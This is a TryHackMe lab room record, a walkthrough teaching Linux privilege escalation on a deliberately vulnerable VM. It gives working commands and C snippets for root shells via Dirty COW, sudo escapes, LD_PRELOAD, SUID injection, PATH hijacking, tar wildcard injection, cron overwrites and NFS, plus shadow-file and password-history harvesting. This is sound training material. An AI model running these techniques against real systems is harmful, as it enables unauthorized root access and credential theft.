{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/43afc4ae36b5432c737ff13fdaf911a5.png', 'title': 'Linux PrivEsc Arena', 'description': 'Students will learn how to escalate privileges using a very vulnerable Linux VM.  SSH is open.  Your credentials are TCM:Hacker123', 'code': 'linuxprivescarena', 'users': 17087, 'tags': ['security', 'linux', 'privesc'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 938, 'created': '2020-06-23T10:02:11.729Z', 'published': '2020-06-23T12:54:30.834Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://i.imgur.com/5pWQzP0.png', 'creator': 'TCM', 'tasks': [{'taskTitle': '[Optional] Connecting to the TryHackMe network', 'taskDesc': '<p style="text-align:center;">You can either use the browser-based terminal (which appears when you deploy the machine), or you can connect to TryHackMe\'s network (via OpenVPN) and SSH in directly.\xa0<span style="font-size:1rem;">If you\'ve not done this before, first complete the\xa0</span><a href="https://tryhackme.com/room/openvpn" target="_blank">OpenVPN room</a><span style="font-size:1rem;">\xa0and learn how to connect.</span></p>', 'taskType': 'none', 'taskNo': 1, 'taskCreated': '2020-06-19T10:11:02.768Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the above.', 'hint': ''}]}, {'taskTitle': 'Deploy the vulnerable machine', 'taskDesc': '<p>This room will teach you a variety of Linux privilege escalation tactics, including kernel exploits, sudo attacks, SUID attacks, scheduled task attacks, and more.\xa0<span style="font-size:1rem;">This lab was built utilizing Sagi Shahar\'s privesc workshop (</span><a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a>)<span style="font-size:1rem;">\xa0and utilized as part of The Cyber Mentor\'s Linux Privilege Escalation Udemy course (</span><a href="http://udemy.com/course/linux-privilege-escalation-for-beginners" target="_blank">http://udemy.com/course/linux-privilege-escalation-for-beginners</a>)<span style="font-size:1rem;">.</span></p><p>All tools needed to complete this course are in the\xa0<span style="font-weight:bolder;">user</span>\xa0folder (/home/user/tools).</p><p>Let\'s first connect to the machine.\xa0<span style="font-size:1rem;">SSH is open on port 22. Your credentials are:</span></p><p><span style="font-weight:bolder;">username</span>: TCM<br /><span style="font-weight:bolder;">password</span>: Hacker123</p>', 'taskType': 'vm', 'taskNo': 2, 'taskCreated': '2020-06-19T10:12:49.865Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5eec79ca1d7b0556084a41e4', 'questions': [{'questionNo': 1, 'question': 'Deploy the machine and log into the user account via SSH (or use the browser-based terminal).', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Kernel Exploits', 'taskDesc': '<div><span style="font-size:24px">Detection</span><span style="font-size:24px"><br /></span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh</b></div><div>2. From the output, notice that the OS is vulnerable to “dirtycow”.</div><div><br /></div><div><span style="font-size:24px">Exploitation</span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w</b></div><div>2. In command prompt type: <b>./c0w</b></div><div><b><br /></b></div><div><b style="color:rgb(231, 99, 99)">Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.</b></div><div><b><br /></b></div><div>3. In command prompt type: <b>passwd</b></div><div>4. In command prompt type: <b>id</b></div><div><br /></div><div>From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary</div>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2020-06-20T20:52:38.626Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Stored Passwords (Config Files)', 'taskDesc': '<div><b><span style="font-size:24px;">Exploitation</span></b></div><div><b><span style="font-size:24px;"><br /></span></b></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>cat /home/user/myvpn.ovpn</b></div><div>2. From the output, make note of the value of the “auth-user-pass” directive.</div><div>3. In command prompt type: <b>cat /etc/openvpn/auth.txt</b></div><div>4. From the output, make note of the clear-text credentials.</div><div>5. In command prompt type: <b>cat /home/user/.irssi/config | grep -i passw</b></div><div>6. From the output, make note of the clear-text credentials.</div>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2020-06-20T20:56:25.418Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What password did you find?', 'hint': ''}, {'questionNo': 2, 'question': "<p>What user's credentials were exposed in the OpenVPN auth file?</p>", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Stored Passwords (History)', 'taskDesc': '<div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div>1. In command prompt type: <b>cat ~/.bash_history | grep -i passw</b></div><div>2. From the output, make note of the clear-text credentials.</div>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2020-06-20T21:00:23.173Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What was TCM trying to log into?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Who was TCM trying to log in as?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Naughty naughty.\xa0 What was the password discovered?</p>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Weak File Permissions', 'taskDesc': '<span style="font-size:24px;">Detection</span><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>ls -la /etc/shadow</b></div><div>2. Note the file permissions</div><div><br /></div><div><span style="font-size:24px;">Exploitation</span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:\xa0<b style="font-size:1rem;">cat /etc/passwd</b></div><div>2. Save the output to a file on your attacker machine</div><div>3. In command prompt type: <b>cat /etc/shadow</b></div><div>4.\xa0<span style="font-size:1rem;">Save the output to a file on your attacker machine</span></div><div><span style="font-size:1rem;"><br /></span></div><div>Attacker VM<span style="font-size:1rem;"><br /></span></div><div><span style="font-size:1rem;"><br /></span></div><div>1.\xa0<span style="font-size:1rem;">In command prompt type:\xa0</span><b>unshadow &lt;PASSWORD-FILE&gt; &lt;SHADOW-FILE&gt; &gt; unshadowed.txt</b></div><div><br /></div><div>Now, you have an unshadowed file.\xa0 We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.\xa0 For example:</div><div><br /></div><div><b>hashcat -m 1800 unshadowed.txt rockyou.txt -O</b></div>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2020-06-20T21:03:30.498Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What were the file permissions on the /etc/shadow file?', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - SSH Keys', 'taskDesc': '<span style="font-size:24px;">Detection</span><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><div><b>find / -name authorized_keys 2&gt; /dev/null</b></div></div><div>2. In a command prompt type:</div><div><span style="font-weight:bolder;">find / -name id_rsa 2&gt; /dev/null</span><br /></div><div>3. Note the results.</div><div><br /></div><div><span style="font-size:24px;">Exploitation</span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.</div><div><span style="font-size:1rem;"><br /></span></div><div>Attacker VM<span style="font-size:1rem;"><br /></span></div><div><span style="font-size:1rem;"><br /></span></div><div>1.\xa0<span style="font-size:1rem;">In command prompt type:\xa0</span><span style="font-weight:bolder;">chmod 400 id_rsa</span></div><div>2.\xa0<span style="font-size:1rem;">In command prompt type: <b>ssh -i id_rsa root@&lt;ip&gt;</b></span></div><div><br /></div><div>You should now have a root shell :)</div>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2020-06-20T21:09:36.510Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "What's the full file path of the sensitive file you discovered?", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Sudo (Shell Escaping)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b><span style="font-size:24px;">\ufeff</span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>sudo -l</b></div><div>2. From the output, notice the list of programs that can run via sudo.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type any of the following:</div><div>a. <b>sudo find /bin -name nano -exec /bin/sh \\;</b></div><div>b. <b>sudo awk \'BEGIN {system("/bin/sh")}\'</b></div><div>c. <b>echo "os.execute(\'/bin/sh\')" &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse</b></div><div>d. <b>sudo vim -c \'!sh\'</b></div>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2020-06-20T21:15:30.886Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Sudo (Abusing Intended Functionality)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>sudo -l</b></div><div>2. From the output, notice the list of programs that can run via sudo.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>sudo apache2 -f /etc/shadow</b></div><div>2. From the output, copy the root hash.</div><div><br /></div><div>Attacker VM</div><div><br /></div><div>1. Open command prompt and type:</div><div><b>echo \'[Pasted Root Hash]\' &gt; hash.txt</b></div><div>2. In command prompt type:</div><div><b>john --wordlist=/usr/share/wordlists/nmap.lst hash.txt</b></div><div>3. From the output, notice the cracked credentials.</div>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2020-06-20T21:18:42.798Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Sudo (LD_PRELOAD)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>sudo -l</b></div><div>2. From the output, notice that the <b>LD_PRELOAD</b> environment variable is intact.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>1. Open a text editor and type: </div><div><br /></div><div><b>#include &lt;stdio.h&gt;</b></div><div><b>#include &lt;sys/types.h&gt;</b></div><div><b>#include &lt;stdlib.h&gt;</b></div><div><b><br /></b></div><div><b>void _init() { </b></div><div><b>\xa0 \xa0 unsetenv("LD_PRELOAD");</b></div><div><b>\xa0 \xa0 setgid(0);</b></div><div><b>\xa0 \xa0 setuid(0);</b></div><div><b>\xa0 \xa0 system("/bin/bash");</b></div><div><b>}</b></div><div><br /></div><div>2. Save the file as x.c</div><div>3. In command prompt type:</div><div><b>gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles</b></div><div>4. In command prompt type:</div><div><b>sudo LD_PRELOAD=/tmp/x.so apache2</b></div><div>5. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2020-06-20T21:21:16.305Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - SUID (Shared Object Injection)', 'taskDesc': '<div><b><span style="font-size:24px">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>find / -type f -perm -04000 -ls 2&gt;/dev/null</b></div><div>2. From the output, make note of all the SUID binaries.</div><div>3. In command line type:</div><div><b>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -i -E "open|access|no such file"</b></div><div>4. From the output, notice that a .so file is missing from a writable directory.</div><div><br /></div><div><b><span style="font-size:24px">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>5. In command prompt type: <b>mkdir /home/user/.config</b></div><div>6. In command prompt type: <b>cd /home/user/.config</b></div><div>7. Open a text editor and type:</div><div><br /></div><div><b>#include &lt;stdio.h&gt;</b></div><div><b>#include &lt;stdlib.h&gt;</b></div><div><b><br /></b></div><div><b>static void inject() __attribute__((constructor));</b></div><div><b><br /></b></div><div><b>void inject() {</b></div><div><span style="font-size:1rem"><b>\xa0 \xa0 system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");</b></span></div><div><span style="font-size:1rem"><b>}</b></span></div><div><span style="font-size:1rem"><br /></span></div><div>8. Save the file as <b>libcalc.c</b></div><div>9. In command prompt type:</div><div><b>gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c</b></div><div>10. In command prompt type: <b>/usr/local/bin/suid-so</b></div><div>11. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2020-06-20T21:27:05.362Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - SUID (Symlinks)', 'taskDesc': '<div><b><span style="font-size:24px">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>dpkg -l | grep nginx</b></div><div>2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.</div><div><br /></div><div><b><span style="font-size:24px">Exploitation</span></b></div><div><br /></div><div>Linux VM – Terminal 1</div><div><br /></div><div>1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: <b>su root</b></div><div>2. The root password is <b>password123</b></div><div>3. Once escalated to root, in command prompt type: <b>su -l www-data</b></div><div>4. In command prompt type: <b>/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log</b></div><div>5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.</div><div><br /></div><div>Linux VM – Terminal 2</div><div><br /></div><div>1. Once logged in, type: <b>su root</b></div><div>2. The root password is <b>password123</b></div><div>3. As root, type the following: <b>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</b></div><div>4. Switch back to the previous terminal.</div><div><br /></div><div>Linux VM – Terminal 1</div><div><br /></div><div>1. From the output, notice that the exploit continued its execution.</div><div>2. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 12, 'taskCreated': '2020-06-20T21:30:38.514Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What CVE is being exploited in this task?', 'hint': ''}, {'questionNo': 2, 'question': '<p>What binary is SUID enabled and assists in the attack?</p>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - SUID (Environment Variables #1)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>find / -type f -perm -04000 -ls 2&gt;/dev/null</b></div><div>2. From the output, make note of all the SUID binaries.</div><div>3. In command prompt type: <b>strings /usr/local/bin/suid-env</b></div><div>4. From the output, notice the functions used by the binary.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>echo \'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }\' &gt; /tmp/service.c</b></div><div>2. In command prompt type: <b>gcc /tmp/service.c -o /tmp/service</b></div><div>3. In command prompt type: <b>export PATH=/tmp:$PATH</b></div><div>4. In command prompt type: <b>/usr/local/bin/suid-env</b></div><div>5. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 13, 'taskCreated': '2020-06-20T22:04:51.916Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the last line of the "<span style="font-weight:bolder;color:rgb(0, 0, 0);">strings /usr/local/bin/suid-env" </span><span style="color:rgb(0, 0, 0);">output?</span>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - SUID (Environment Variables #2)', 'taskDesc': '<div><b><span style="font-size:24px">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>find / -type f -perm -04000 -ls 2&gt;/dev/null</b></div><div>2. From the output, make note of all the SUID binaries.</div><div>3. In command prompt type: strings <b>/usr/local/bin/suid-env2</b></div><div>4. From the output, notice the functions used by the binary.</div><div><br /></div><div><b><span style="font-size:24px">Exploitation Method #1</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }</b></div><div>2. In command prompt type:</div><div><b>export -f /usr/sbin/service</b></div><div>3. In command prompt type: <b>/usr/local/bin/suid-env2</b></div><div><br /></div><div><b><span style="font-size:24px">Exploitation Method #2</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>env -i SHELLOPTS=xtrace PS4=\'$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +s /tmp/bash)\' /bin/sh -c \'/usr/local/bin/suid-env2; set +x; /tmp/bash -p\'</b></div>', 'taskType': 'none', 'taskNo': 14, 'taskCreated': '2020-06-20T22:09:22.971Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the last line of the "<span style="font-weight:bolder;color:rgb(0, 0, 0)">strings /usr/local/bin/suid-env2"\xa0</span><span style="color:rgb(0, 0, 0)">output?</span>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Capabilities', 'taskDesc': '<div><span style="font-weight:bolder;"><span style="font-size:24px;">Detection</span></span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:\xa0<span style="font-weight:bolder;">getcap -r / 2&gt;/dev/null</span></div><div>2. From the output, notice the value of the “cap_setuid” capability.</div><div><br /></div><div><span style="font-weight:bolder;"><span style="font-size:24px;">Exploitation</span></span></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><span style="font-weight:bolder;">/usr/bin/python2.6 -c \'import os; os.setuid(0); os.system("/bin/bash")\'</span></div><div>2. Enjoy root!</div>', 'taskType': 'none', 'taskNo': 15, 'taskCreated': '2020-06-20T22:13:21.869Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Cron (Path)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>cat /etc/crontab</b></div><div>2. From the output, notice the value of the “PATH” variable.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' &gt; /home/user/overwrite.sh</b></div><div>2. In command prompt type: <b>chmod +x /home/user/overwrite.sh</b></div><div>3. Wait 1 minute for the Bash script to execute.</div><div>4. In command prompt type: <b>/tmp/bash -p</b></div><div>5. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 16, 'taskCreated': '2020-06-20T22:13:49.513Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Cron (Wildcards)', 'taskDesc': '<div><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>cat /etc/crontab</b></div><div>2. From the output, notice the script “/usr/local/bin/compress.sh”</div><div>3. In command prompt type: <b>cat /usr/local/bin/compress.sh</b></div><div>4. From the output, notice the wildcard (*) used by ‘tar’.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' &gt; /home/user/runme.sh</b></div><div>2. <b>touch /home/user/--checkpoint=1</b></div><div>3. <b>touch /home/user/--checkpoint-action=exec=sh\\ runme.sh</b></div><div>4. Wait 1 minute for the Bash script to execute.</div><div>5. In command prompt type: <b>/tmp/bash -p</b></div><div>6. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 17, 'taskCreated': '2020-06-20T22:15:44.899Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - Cron (File Overwrite)', 'taskDesc': '<div><span>\ufeff</span><b><span style="font-size:24px;">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>cat /etc/crontab</b></div><div>2. From the output, notice the script “overwrite.sh”</div><div>3. In command prompt type: <b>ls -l /usr/local/bin/overwrite.sh</b></div><div>4. From the output, notice the file permissions.</div><div><br /></div><div><b><span style="font-size:24px;">Exploitation</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type:</div><div><b>echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' &gt;&gt; /usr/local/bin/overwrite.sh</b></div><div>2. Wait 1 minute for the Bash script to execute.</div><div>3. In command prompt type: <b>/tmp/bash -p</b></div><div>4. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 18, 'taskCreated': '2020-06-20T22:17:26.283Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}, {'taskTitle': 'Privilege Escalation - NFS Root Squashing', 'taskDesc': '<div><b><span style="font-size:24px">Detection</span></b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command line type:\xa0<b style="font-size:1rem">cat /etc/exports</b></div><div>2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.</div><div><br /></div><div><b><span style="font-size:24px">Exploitation</span></b></div><div><br /></div><div>Attacker VM</div><div><br /></div><div>1. Open command prompt and type:\xa0<b style="font-size:1rem">showmount -e MACHINE_IP</b></div><div>2. In command prompt type: <b>mkdir /tmp/1</b></div><div>3. In command prompt type: <b>mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1</b></div><div>In command prompt type:</div><div><b>echo \'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }\' &gt; /tmp/1/x.c</b></div><div>4. In command prompt type: <b>gcc /tmp/1/x.c -o /tmp/1/x</b></div><div>5. In command prompt type: <b>chmod +s /tmp/1/x</b></div><div><br /></div><div>Linux VM</div><div><br /></div><div>1. In command prompt type: <b>/tmp/x</b></div><div>2. In command prompt type: <b>id</b></div>', 'taskType': 'none', 'taskNo': 19, 'taskCreated': '2020-06-20T22:18:46.039Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "Click 'Completed' once you have successfully elevated the machine", 'hint': ''}]}]}